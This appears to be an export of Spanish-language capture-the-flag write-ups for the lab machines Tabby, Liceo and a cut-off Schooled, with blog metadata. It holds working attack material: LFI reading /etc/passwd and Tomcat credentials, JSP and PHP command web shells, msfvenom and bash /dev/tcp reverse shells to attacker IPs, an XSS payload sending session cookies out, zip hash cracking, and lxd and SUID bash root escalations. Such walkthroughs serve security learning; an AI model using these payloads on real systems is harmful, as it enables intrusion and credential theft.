http://megahosting.htb/news.php?file=statement\nPara poder ver la página, hay que añadir el dominio en el /etc/hosts\nUna vez vemos la página observamos que hay un parámetro en la url que se llama file. El gobuster detecto que había una carpeta llamada files, lo que puede estar pasando es que el parámetro ?file= este cargando el contenido de archivos que hay en files. Esto lo podemos comprobar de la siguiente forma\nVemos que lo que se muestra en news.php?file=statement es lo mismo que hay en /files/statement. Sabiendo esto probamos de explotar un LFI (Local File Inclusion)\ncurl http://megahosting.htb/news.php?file=../../../../../../../../../etc/passwd root❌0:0:root:/root:/bin/bash daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin bin❌2:2:bin:/bin:/usr/sbin/nologin sys❌3:3:sys:/dev:/usr/sbin/nologin sync❌4:65534:sync:/bin:/bin/sync games❌5:60:games:/usr/games:/usr/sbin/nologin man❌6:12:man:/var/cache/man:/usr/sbin/nologin lp❌7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail❌8:8:mail:/var/mail:/usr/sbin/nologin news❌9:9:news:/var/spool/news:/usr/sbin/nologin uucp❌10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy❌13:13:proxy:/bin:/usr/sbin/nologin www-data❌33:33:www-data:/var/www:/usr/sbin/nologin backup❌34:34:backup:/var/backups:/usr/sbin/nologin list❌38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc❌39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats❌41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody❌65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network❌100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve❌101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync❌102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus❌103:106::/nonexistent:/usr/sbin/nologin syslog❌104:110::/home/syslog:/usr/sbin/nologin _apt❌105:65534::/nonexistent:/usr/sbin/nologin tss❌106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd❌107:112::/run/uuidd:/usr/sbin/nologin tcpdump❌108:113::/nonexistent:/usr/sbin/nologin landscape❌109:115::/var/lib/landscape:/usr/sbin/nologin pollinate❌110:1::/var/cache/pollinate:/bin/false sshd❌111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump❌999:999:systemd Core Dumper:/:/usr/sbin/nologin lxd❌998💯:/var/snap/lxd/common/lxd:/bin/false tomcat❌997:997::/opt/tomcat:/bin/false mysql❌112:120:MySQL Server,,,:/nonexistent:/bin/false ash❌1000:1000:clive:/home/ash:/bin/bashc Ya tenemos la capacidad de enumerar archivos dentro de la máquina.\nEn el /etc/passwd vemos la existencia del usuario ash, al se le puede intentar robar la llave id_rsa de ssh\ncurl http://megahosting.htb/news.php?file=../../../../../../../../../home/ash/.ssh/id_rsa Pero no podemos verla.\nSi recordamos del escaneo de nmap, había otro puerto abierto, el 8080, este puerto tiene un tomcat corriendo. Al entrar aparece un mensaje diciendo.\nUsers are defined in /etc/tomcat9/tomcat-users.xml. Intentamos ver el archivo /etc/tomcat9/tomcat-users.xml desde el LFI, pero no se puede\ncurl http://megahosting.htb/news.php?file=../../../../../../../../../etc/tomcat9/tomcat-users.xml Haciendo una búsqueda por internet, encontré que también se pueden guardar en /usr/share/tomcat9/etc/tomcat-users.xml\ncurl -s http://megahosting.htb/news.php?file=../../../../../../../../../usr/share/tomcat9/etc/tomcat-users.xml | grep username you must define such a user - the username and password are arbitrary. It is \u0026lt;user username=\u0026#34;tomcat\u0026#34; password=\u0026#34;\u0026lt;must-be-changed\u0026gt;\u0026#34; roles=\u0026#34;tomcat\u0026#34;/\u0026gt; \u0026lt;user username=\u0026#34;both\u0026#34; password=\u0026#34;\u0026lt;must-be-changed\u0026gt;\u0026#34; roles=\u0026#34;tomcat,role1\u0026#34;/\u0026gt; \u0026lt;user username=\u0026#34;role1\u0026#34; password=\u0026#34;\u0026lt;must-be-changed\u0026gt;\u0026#34; roles=\u0026#34;role1\u0026#34;/\u0026gt; \u0026lt;user username=\u0026#34;tomcat\u0026#34; password=\u0026#34;$3cureP4s5w0rd123!\u0026#34; roles=\u0026#34;admin-gui,manager-script\u0026#34;/\u0026gt; Tenemos las credenciales del usuario tomcat!\nSi nos logeamos desde /manager en el tomcat, nos aparece el siguiente error\nBy default the Manager is only accessible from a browser running on the same machine as Tomcat Básicamente que no podemos entrar, a no ser que estemos accediendo desde la misma máquina. Si nos fijamos en los roles que tiene el usuario tomcat, vemos que tiene el rol manager-script. Este rol nos permite poder subir archivos de la siguiente forma.\nPrimero creamos un .war que nos permita ejecutar comandos\nmkdir war cd war nano index.jsp \u0026lt;form method=GET action=\u0026#39;index.jsp\u0026#39;\u0026gt; \u0026lt;input name=\u0026#39;cmd\u0026#39; type=text\u0026gt; \u0026lt;input type=submit value=\u0026#39;Run\u0026#39;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.*\u0026#34; %\u0026gt; \u0026lt;% String cmd = request.getParameter(\u0026#34;cmd\u0026#34;); String output = \u0026#34;\u0026#34;; if(cmd != null) { String s = null; try { Process p = Runtime.getRuntime().exec(cmd,null,null); BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream())); while((s = sI.readLine()) != null) { output += s+\u0026#34;\u0026lt;/br\u0026gt;\u0026#34;; } } catch(IOException e) { e.printStackTrace(); } } %\u0026gt; \u0026lt;pre\u0026gt;\u0026lt;%=output %\u0026gt;\u0026lt;/pre\u0026gt; jar -cvf ../evil.war * cd ../ Lo subimos\ncurl --upload-file evil.war \u0026#39;http://tomcat:$3cureP4s5w0rd123!@10.10.10.194:8080/manager/text/deploy?path=/evil2\u0026amp;update=true\u0026#39; OK - Deployed application at context path [/evil2] Ya podemos ejecutar comandos\ncurl \u0026#34;megahosting.htb:8080/evil2/index.jsp?cmd=id\u0026#34; \u0026lt;form method=GET action=\u0026#39;index.jsp\u0026#39;\u0026gt; \u0026lt;input name=\u0026#39;cmd\u0026#39; type=text\u0026gt; \u0026lt;input type=submit value=\u0026#39;Run\u0026#39;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;pre\u0026gt;uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)\u0026lt;/br\u0026gt;\u0026lt;/pre\u0026gt; Para conseguir la reverse shell creamos otro .war con msfvenom\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.32 LPORT=443 -f war -o shell.war Lo subimos\ncurl --upload-file shell.war \u0026#39;http://tomcat:$3cureP4s5w0rd123!@10.10.10.194:8080/manager/text/deploy?path=/shell\u0026amp;update=true\u0026#39; Nos ponemos en escucha con nc por el puerto 443\nnc -nlvp 443 Hacemos una petición al archivo y recibimos la shell\ncurl \u0026#34;megahosting.htb:8080/shell/\u0026#34; Escalada de privilegios Antes de seguir, vamos a hacer un tratamiento de la tty para poder ejecutar ctr + c, ctrl + l, nano\u0026hellip;\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm Ahora si hacemos un echo $TERM vemos que vale dumb, pero para poder hacer ctrl + l necesitamos que valga xterm\nexport TERM=xterm Por último si miramos la shell que tenemos echo $SHELL vemos que tenemos /usr/sbin/nologin asi que vamos a asignar una bash\nexport SHELL=bash Después de un rato buscando, encontramos 16162020_backup.zip.\ntomcat@tabby:/var/www/html/files$ ls 16162020_backup.zip archive revoked_certs statement Al descomprimirlo pide una contraseña\ntomcat@tabby:/var/www/html/files$ unzip 16162020_backup.zip Archive: 16162020_backup.zip checkdir error: cannot create var Read-only file system unable to process var/www/html/assets/. [16162020_backup.zip] var/www/html/favicon.ico password: Para encontrar la contraseña, nos pasamos el zip a nuestra máquina\nLe sacamos el hash con zip2john\nzip2john 16162020_backup.zip \u0026gt; hash Ahora lo rompemos con john\njohn --wordlist=/usr/share/wordlists/rockyou.txt hash john --show hash 16162020_backup.zip:admin@it::16162020_backup.zip:var/www/html/news.php, var/www/html/favicon.ico, var/www/html/Readme.txt, var/www/html/logo.png, var/www/html/index.php:16162020_backup.zip 1 password hash cracked, 0 left La contraseña del zip es admin@it.\nDentro del zip no hay nada.\nAl probar, encontramos que esta contraseña se reutiliza para el usuario ash\nAl consultar los grupos del usuario ash identificamos que está en el grupo lxd\nash@tabby:~$ id uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd) Para aprovecharnos de este grupo para escalar privilegios, haremos lo siguiente en nuestra máquina\ngit clone https://github.com/saghul/lxd-alpine-builder cd lxd-alpine-builder bash build-alpine Esto nos generará este archivo: alpine-v3.20-x86_64-20240606_1419.tar.gz el cual tenemos que pasar a la máquina víctima junto con este script searchsploit -m linux/local/46978.sh\nash@tabby:/tmp$ ./46978.sh -f alpine-v3.20-x86_64-20240606_1419.tar.gz ./46978.sh: line 21: lxc: command not found Al ejecutarlo, nos dice que el comando lxc no existe.\nLo que puede ser es que si esté el lxc, pero no en el PATH, para ello vamos a buscar si hay algún lxc\nash@tabby:/tmp$ find / -name lxc 2\u0026gt;/dev/null /snap/lxd/14804/bin/lxc /snap/lxd/14804/commands/lxc /snap/lxd/14804/lxc /snap/lxd/21468/bin/lxc /snap/lxd/21468/commands/lxc /snap/lxd/21468/lxc /snap/bin/lxc /var/snap/lxd/common/lxc /etc/bash_completion.d/lxc /usr/share/bash-completion/completions/lxc Efectivamente, si existe el lxc, pero no está en el PATH, asi que lo añadimos\nash@tabby:/tmp$ export PATH=$PATH:/snap/bin/ Ahora nos sale Error: open alpine-v3.20-x86_64-20240606_1419.tar.gz: no such file or directory\nash@tabby:/tmp$ ./46978.sh -f alpine-v3.20-x86_64-20240606_1419.tar.gz If this is your first time running LXD on this machine, you should also run: lxd init To start your first instance, try: lxc launch ubuntu:18.04 Error: open alpine-v3.20-x86_64-20240606_1419.tar.gz: no such file or directory [*] Listing images... +-------+-------------+--------+-------------+--------------+------+------+-------------+ | ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCHITECTURE | TYPE | SIZE | UPLOAD DATE | +-------+-------------+--------+-------------+--------------+------+------+-------------+ Creating privesc Error: Not Found Este error me dio un poco de dolor de cabeza porque no entendía porque no funcionaba.\nAl final probé de mover el archivo a otra ruta, como por ejemplo el /home de ash\nash@tabby:/tmp$ mv alpine-v3.20-x86_64-20240606_1419.tar.gz /home/ash/ ash@tabby:/tmp$ ./46978.sh -f /home/ash/alpine-v3.20-x86_64-20240606_1419.tar.gz [*] Listing images... +--------+--------------+--------+-------------------------------+--------------+-----------+--------+-----------------------------+ | ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCHITECTURE | TYPE | SIZE | UPLOAD DATE | +--------+--------------+--------+-------------------------------+--------------+-----------+--------+-----------------------------+ | alpine | 099f19378603 | no | alpine v3.20 (20240606_14:19) | x86_64 | CONTAINER | 3.67MB | Jun 6, 2024 at 4:28pm (UTC) | +--------+--------------+--------+-------------------------------+--------------+-----------+--------+-----------------------------+ Creating privesc Device giveMeRoot added to privesc ~ # Ahora ya estamos dentro del contenedor que hemos creado como el usuario root\nAhora dentro del /mnt/root tenemos montada la raiz de la máquina host\n/ # cd /mnt/root /mnt/root # ls bin etc lib64 mnt run sys boot home libx32 opt sbin tmp cdrom lib lost+found proc snap usr dev lib32 media root srv var Así que con un cat al /mnt/root/root/root.txt vemos la flag\n","date":"2024-06-06","id":33,"permalink":"/writeups/hackthebox/tabby/","summary":"En esta máquina, primero explotamos una vulnerabilidad de Local File Inclusion (LFI) para enumerar los usuarios de Tomcat. Luego, logramos la ejecución remota de código (RCE) subiendo un archivo .war en Tomcat. Para la escalada de privilegios, extrajimos las credenciales de un archivo zip y abusamos del grupo lxd.","tags":[],"title":"Tabby"},{"content":"","date":"2024-03-28","id":34,"permalink":"/tags/file-upload/","summary":"","tags":[],"title":"File Upload"},{"content":"Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n\u0026gt; ping -c 1 192.168.1.149 PING 192.168.1.149 (192.168.1.149) 56(84) bytes of data. 64 bytes from 192.168.1.149: icmp_seq=1 ttl=64 time=0.818 ms --- 192.168.1.149 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 0.818/0.818/0.818/0.000 ms Tenemos conexión y en este caso da un ttl (time to live) de 64, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Linux\nEscaneo de puertos Ahora empezamos con un escaneo de puertos\n$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 192.168.1.149 -oG allPorts Explicación parámetros\rParámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Para saltar la comprobación de sí la máquina está activa o no -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n\u0026gt; extractPorts allPorts ───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 192.168.1.149 5 │ [*] Open ports: 21,22,80 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios que corren por los puertos y ejecutar scripts básicos de reconocimientos de nmap\n\u0026gt; sudo nmap -p21,22,80 -sCV 192.168.1.149 -oN versions PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.5 | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-rw-rw-r-- 1 1000 1000 191 Feb 01 14:29 note.txt | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:192.168.1.145 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 3 | vsFTPd 3.0.5 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 68:4c:42:8d:10:2c:61:56:7b:26:c4:78:96:6d:28:15 (ECDSA) |_ 256 7e:1a:29:d8:9b:91:44:bd:66:ff:6a:f3:2b:c7:35:65 (ED25519) 80/tcp open http Apache httpd 2.4.52 ((Ubuntu)) |_http-title: Liceo |_http-server-header: Apache/2.4.52 (Ubuntu) Explicación parámetros\rParámetro Función -p Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts básicos de reconocimiento -sV Proporciona la versión e información de los servicios que corren por los puertos FTP Nmap ha reportado que el puerto 21 está abierto, tiene un FTP con el \u0026ldquo;Anonymous login allowed\u0026rdquo; y dentro hay un archivo llamado note.txt\n\u0026gt; wget ftp://192.168.1.149/note.txt note.txt 100%[=========================================================================================================================\u0026gt;] 191 --.-KB/s in 0s 2024-03-28 14:19:49 (891 KB/s) - ‘note.txt’ saved [191] \u0026gt; cat note.txt ───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────── │ File: note.txt ───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────── 1 │ Hi Matias, I have left on the web the continuations of today\u0026#39;s work, 2 │ would you mind contiuing in your turn and make sure that the web will be secure? 3 │ Above all, we dont\u0026#39;t want intruders... ───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────── Hola Matias, te he dejado en la web las continuaciones del trabajo de hoy, ¿Te importaría continuar en tu turno y asegurarte de que la web sea segura? Sobre todo, no queremos intrusos... Con este mensaje podemos deducir un posible usuario llamado Matias.\nHTTP Empezamos analizando la web con whatweb\n\u0026gt; whatweb 192.168.1.149 http://192.168.1.149 [200 OK] Apache[2.4.52], Bootstrap, Country[RESERVED][ZZ], Email[liceoescuela@liceo.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.1.149], JQuery[3.4.1], Script, Title[Liceo], X-UA-Compatible[IE=edge] Tenemos un email: liceoescuela@liceo.com\nEsta dirección de correo usa el dominio liceo.com. Esta información la podemos usar para después buscar subdominios.\nSi consultamos la página web desde el navegador, no vemos ninguna función destacable, así que procedemos a hacer fuzzing para encontrar subdirectorios con la herramienta gobuster\n\u0026gt; gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.1.149 -x php,html,txt =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://192.168.1.149 [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: php,html,txt [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /.php (Status: 403) [Size: 278] /images (Status: 301) [Size: 315] [--\u0026gt; http://192.168.1.149/images/] /index.html (Status: 200) [Size: 21487] /.html (Status: 403) [Size: 278] /uploads (Status: 301) [Size: 316] [--\u0026gt; http://192.168.1.149/uploads/] /upload.php (Status: 200) [Size: 371] /css (Status: 301) [Size: 312] [--\u0026gt; http://192.168.1.149/css/] /js (Status: 301) [Size: 311] [--\u0026gt; http://192.168.1.149/js/] Rápidamente aparecen 2 rutas las cuales llaman la atención: uploads y upload.php\nEn el upload.php podemos subir un archivo, vamos a subir un php simplón y lo interceptaremos con burpsuite\nNos aparece un error diciendo que no se pueden subir archivos con la extensión php. Los scripts en php pueden usar otras extensiones que no sean php, para descubrir cuáles son las que bloquea vamos a usar el intruder de burpsuite.\nAñadimos la extensión como variable y subimos un payload con todas las extensiones\n\u0026gt; cat Downloads/extensions.txt ───────┬────────────────────────────────────────────────────────────────────────────────────────────── │ File: Downloads/extensions.txt ───────┼────────────────────────────────────────────────────────────────────────────────────────────── 1 │ php 2 │ php2 3 │ php3 4 │ php4 5 │ php5 6 │ php6 7 │ php7 8 │ phps 9 │ phps 10 │ pht 11 │ phtm 12 │ phtml 13 │ pgif 14 │ shtml 15 │ htaccess 16 │ phar 17 │ inc 18 │ hphp 19 │ ctp 20 │ module ───────┴────────────────────────────────────────────────────────────────────────────────────────────── Ahora ya podemos ver el resultado con las demás extensiones\nAl final la única que estaba bloqueada era .php\nAhora ya podemos ejecutar comandos\n\u0026gt; curl -s -G \u0026#34;192.168.1.149/uploads/shell.phtml\u0026#34; --data-urlencode \u0026#34;telepathy=whoami\u0026#34; www-data Qué código shell.phtml que nos permite ejecutar comandos?\rEl archivo shell.php tiene el siguiente código\n\u0026lt;?php echo shell_exec($_GET[\u0026#34;telepathy\u0026#34;]); ?\u0026gt; Lo que hace básicamente es pasarle a la función shell_exec todo lo que recibe por GET por el parámetro telepathy.\nLa función shell_exec lo que hace es ejecutar comandos en el sistema, pero no muestra el output, para hacer que muestre el output hay que poner el echo delante\nSin echo\nd3bo~\u0026gt; cat test.php 1 \u0026lt;?php shell_exec(\u0026#34;whoami\u0026#34;) ?\u0026gt; d3bo~\u0026gt; php test.php Con echo\nd3bo~\u0026gt; cat test.php 1 \u0026lt;?php echo shell_exec(\u0026#34;whoami\u0026#34;) ?\u0026gt; d3bo~\u0026gt; php test.php d3bo Si shell_exec no funcionara o está bloqueado, se pueden usar otras funciones, a continuación os dejo unos ejemplos\nsystem()\nd3bo~\u0026gt; cat test.php 1 \u0026lt;?php system(\u0026#34;whoami\u0026#34;) ?\u0026gt; d3bo~\u0026gt; php test.php d3bo passthru()\nd3bo~\u0026gt; cat test.php 1 \u0026lt;?php passthru(\u0026#34;whoami\u0026#34;) ?\u0026gt; d3bo~\u0026gt; php test.php d3bo exec()\nd3bo~\u0026gt; cat test.php 1 \u0026lt;?php echo exec(\u0026#34;whoami\u0026#34;) ?\u0026gt; d3bo~\u0026gt; php test.php d3bo popen()\nd3bo~\u0026gt; cat test.php 1 \u0026lt;?php 2 $handle = popen(\u0026#39;whoami\u0026#39;, \u0026#39;r\u0026#39;); 3 $read = fread($handle, 2096); 4 pclose($handle); 5 echo $read; 6 ?\u0026gt; 7 d3bo~\u0026gt; php test.php d3bo Intrusión Para ganar acceso a la máquina vamos a ponernos en escucha por el puerto 443\nnc -nlvp 443 Y nos mandamos la reverseshell\ncurl -s -G \u0026#34;192.168.1.149/uploads/shell.phtml\u0026#34; --data-urlencode \u0026#34;telepathy=bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.1.145/443 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34; Antes de la escalada, vamos a hacer un tratamiento de la tty para poder ejecutar ctr + c, ctrl + l, nano\u0026hellip;\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm Ahora si hacemos un echo $TERM vemos que vale dumb, pero para poder hacer ctrl + l necesitamos que valga xterm\nexport TERM=xterm Por último si miramos la shell que tenemos echo $SHELL vemos que tenemos /usr/sbin/nologin asi que vamos a asignar una bash\nexport SHELL=bash Escalada de privilegios Empezamos la escalada buscando archivos con privilegios SUID\nbash-5.1$ find / -perm -4000 -exec ls -ldb {} \\; 2\u0026gt;/dev/null .... -rwsr-xr-x 1 root root 47480 Feb 21 2022 /usr/bin/mount -rwsr-xr-x 1 root root 35192 Feb 21 2022 /usr/bin/umount -rwsr-xr-x 1 root root 232416 Apr 3 2023 /usr/bin/sudo -rwsr-sr-x 1 root root 1396520 Jan 6 2022 /usr/bin/bash De todos los archivos que salen hay uno que llama la atención, este es /usr/bin/bash ya que si bash tiene permisos SUID podemos ejecutar bash con -p de privilege y tener una bash de root\nbash-5.1$ /usr/bin/bash -p bash-5.1# whoami root Máquina terminada\n","date":"2024-03-28","id":35,"permalink":"/writeups/hackmyvm/liceo/","summary":"En esta máquina vamos a saltarnos la protección de subida de archivos de la web y escalaremos privilegios mediante un permiso SUID mal implementado","tags":["SUID","File Upload"],"title":"Liceo"},{"content":"","date":"2024-03-28","id":36,"permalink":"/tags/pkg/","summary":"","tags":[],"title":"pkg"},{"content":"Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n\u0026gt; ping -c 1 10.10.10.234 PING 10.10.10.234 (10.10.10.234) 56(84) bytes of data. 64 bytes from 10.10.10.234: icmp_seq=1 ttl=63 time=36.3 ms --- 10.10.10.234 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 36.284/36.284/36.284/0.000 ms Tenemos conexión y en este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Linux\nEscaneo de puertos Ahora empezamos con un escaneo de puertos\n$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.10.234 -oG allPorts Explicación parámetros\rParámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Para saltar la comprobación de sí la máquina está activa o no -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n\u0026gt; extractPorts allPorts ───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.10.234 5 │ [*] Open ports: 22,80,33060 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios que corren por los puertos y ejecutar scripts básicos de reconocimientos de nmap\n\u0026gt; nmap -p22,80,33060 -sCV 10.10.10.234 -oN versions PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0) | ssh-hostkey: | 2048 1d:69:83:78:fc:91:f8:19:c8:75:a7:1e:76:45:05:dc (RSA) | 256 e9:b2:d2:23:9d:cf:0e:63:e0:6d:b9:b1:a6:86:93:38 (ECDSA) |_ 256 7f:51:88:f7:3c:dd:77:5e:ba:25:4d:4c:09:25:ea:1f (ED25519) 80/tcp open http Apache httpd 2.4.46 ((FreeBSD) PHP/7.4.15) | http-methods: |_ Potentially risky methods: TRACE |_http-title: Schooled - A new kind of educational institute |_http-server-header: Apache/2.4.46 (FreeBSD) PHP/7.4.15 33060/tcp open mysqlx? | fingerprint-strings: | DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: | Invalid message\u0026#34; | HY000 | LDAPBindReq: | *Parse error unserializing protobuf message\u0026#34; | HY000 | oracle-tns: | Invalid message-frame.\u0026#34; |_ HY000 Explicación parámetros\rParámetro Función -p Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts básicos de reconocimiento -sV Proporciona la versión e información de los servicios que corren por los puertos Pues al final no es un linux, nmap ha detectado que estamos frente a un FreeBSD\nPuerto 80 Si observamos la web desde el navegador vemos que es una página muy simple sin ninguna función que llame la atención. En este puto, podemos mediante la herramienta whatweb intentar sacar un poco de información\n\u0026gt; whatweb 10.10.10.234 http://10.10.10.234 [200 OK] Apache[2.4.46], Bootstrap, Country[RESERVED][ZZ], Email[#,admissions@schooled.htb], HTML5, HTTPServer[FreeBSD][Apache/2.4.46 (FreeBSD) PHP/7.4.15], IP[10.10.10.234], PHP[7.4.15], Script, Title[Schooled - A new kind of educational institute], X-UA-Compatible[IE=edge] De toda la información recopilada lo que más llama la atención es el email admissions@schooled.htb, ya que sale un dominio schooled.htb. A partir de este dominio buscamos subdominios con la herramienta wfuzz\necho \u0026#34;10.10.10.234 schooled.htb\u0026#34; \u0026gt;\u0026gt; /etc/hosts \u0026gt; wfuzz -c -t 20 --hc=404 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H \u0026#34;Host: FUZZ.schooled.htb\u0026#34; http://schooled.htb/ ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000015: 200 461 L 1555 W 20750 Ch \u0026#34;ns\u0026#34; 000000031: 200 461 L 1555 W 20750 Ch \u0026#34;mobile\u0026#34; 000000001: 200 461 L 1555 W 20750 Ch \u0026#34;www\u0026#34; 000000003: 200 461 L 1555 W 20750 Ch \u0026#34;ftp\u0026#34; 000000007: 200 461 L 1555 W 20750 Ch \u0026#34;webdisk\u0026#34; 000000040: 200 461 L 1555 W 20750 Ch \u0026#34;ns4\u0026#34; Todos los subdominios devuelven un código de estado 200, así que vamos a usar otro método para filtrar las peticiones que no sea el código de estado, por ejemplo podemos filtrar por la cantidad de caracteres, vamos a ocultar todas las respuestas con 20750 caracteres --hh20750\n\u0026gt; wfuzz -c -t 20 --hh=20750 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H \u0026#34;Host: FUZZ.schooled.htb\u0026#34; http://schooled.htb/ ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000162: 200 1 L 5 W 84 Ch \u0026#34;moodle\u0026#34; Tenemos un subdominio: moodle\necho \u0026#34;10.10.10.234 schooled.htb moodle.schooled.htb\u0026#34; \u0026gt;\u0026gt; /etc/hosts Este subdominio tiene un moodle instalado.\nPara poder navegar por el moodle, creamos una cuenta.\nDentro del curso de matemáticas hay el siguiente mensaje\nEste es un curso de autoinscripción. Para los estudiantes que deseen asistir a mis conferencias, asegúrese de tener configurado su perfil de MoodleNet. Los estudiantes que no configuren sus perfiles de MoodleNet serán eliminados del curso antes de que comience el curso y verificaré a todos los estudiantes que estén inscritos en este curso. Esperamos verlos a todos pronto. manuel phillips En la configuración de nuestro perfil, modificamos el perfil de MoodleNet. En la nota se menciona que el profesor verifica los perfiles de MoodleNet así que podemos probar de hacer un XSS para robarle la cookie al profesor\nCon esto confirmamos que podemos hacer un XSS.\nPara robar la cookie de sesión del professor y así secuestrar su cuenta, usaremos el siguiente payload\n\u0026lt;img src=x onerror=this.src=\u0026#39;http://10.10.14.20/input.php?cookie=\u0026#39;+document.cookie\u0026gt; Después nos montamos un servidor http con python para recibir la petición con la cookie\n\u0026gt; python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.10.234 - - [07/Apr/2024 21:13:44] \u0026#34;GET /input.php?cookie=MoodleSession=j7br6s51ia212og0ghc8htd1f8 HTTP/1.1\u0026#34; 200 - Ahora ya tenemos la cookie y podemos secuestrar la sesión de Manuel Phillips\nConsultando /theme/upgrade.txt encontramos la versión del moodle 3.9\n\u0026gt; curl moodle.schooled.htb/moodle/theme/upgrade.txt This files describes API changes in /theme/* themes, information provided here is intended especially for theme designer. === 3.9 === Con una búsqueda con searchsploit identificamos un exploit para dicha versión\n\u0026gt; searchsploit moodle 3.9 ----------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ----------------------------------------------------------------------------- --------------------------------- Moodle 3.9 - Remote Code Execution (RCE) (Authenticated) | php/webapps/50180.py ----------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results \u0026gt; python3 50180.py http://moodle.schooled.htb/moodle --cookie 4ai0o3jlkpct1pcv6a2go5c687 __ __ __ __ __ __ __ __ / \\ /|_ __ _) / \\ _) / \\ __ /| |__| _) _) /| \\__ \\/ |__ /__ \\__/ /__ \\__/ | | __) /__ | • by lanz Moodle 3.9 - Remote Command Execution (Authenticated as teacher) Course enrolments allowed privilege escalation from teacher role into 